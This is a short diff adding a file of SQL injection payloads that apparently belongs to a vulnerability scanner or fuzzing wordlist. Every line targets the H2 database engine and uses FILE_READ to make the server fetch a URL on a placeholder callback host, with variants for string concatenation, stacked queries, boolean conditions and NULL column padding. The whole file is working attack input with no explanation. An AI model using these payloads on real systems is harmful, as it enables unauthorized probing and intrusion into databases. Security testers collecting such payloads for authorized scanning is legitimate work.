@@ -1,0 +1,11 @@
+FILE_READ('http://DOMAIN/h2-sqli', NULL)
+'|| FILE_READ('http://DOMAIN/h2-sqli', NULL) || '
+int);SELECT ACOS(FILE_READ('http://DOMAIN/h2-sqli', NULL));
+' or FILE_READ('http://DOMAIN/h2-sqli', NULL);
+' and FILE_READ('http://DOMAIN/h2-sqli', NULL);
+',FILE_READ('http://DOMAIN/h2-sqli', NULL);
+',FILE_READ('http://DOMAIN/h2-sqli', NULL),NULL);
+',FILE_READ('http://DOMAIN/h2-sqli', NULL),NULL, NULL);
+',FILE_READ('http://DOMAIN/h2-sqli', NULL),NULL, NULL, NULL);
+',FILE_READ('http://DOMAIN/h2-sqli', NULL),NULL, NULL, NULL, NULL);
+',FILE_READ('http://DOMAIN/h2-sqli', NULL),NULL, NULL, NULL, NULL, NULL);
